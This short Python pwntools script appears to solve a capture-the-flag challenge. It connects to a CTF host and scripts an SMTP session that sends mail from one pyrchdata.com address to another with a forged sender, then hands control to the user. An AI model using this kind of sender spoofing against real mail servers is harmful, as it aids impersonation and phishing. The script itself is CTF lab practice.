from pwn import *
context(log_level='debug')
r = remote('challenge.ctf.games', 32439)

r.sendlineafter(b'SMTP 1.4.6',b'ehlo pyrchdata.com')
r.sendlineafter(b'HELP\r\n',b'mail from:<jdaveren@pyrchdata.com>')
r.sendlineafter(b'OK',b'rcpt to:<swilliams@pyrchdata.com>')
r.sendlineafter(b'OK',b'DATA')
r.sendlineafter(b'with',b'hello from hell')
r.sendline(b'\r\n.\r')

r.interactive()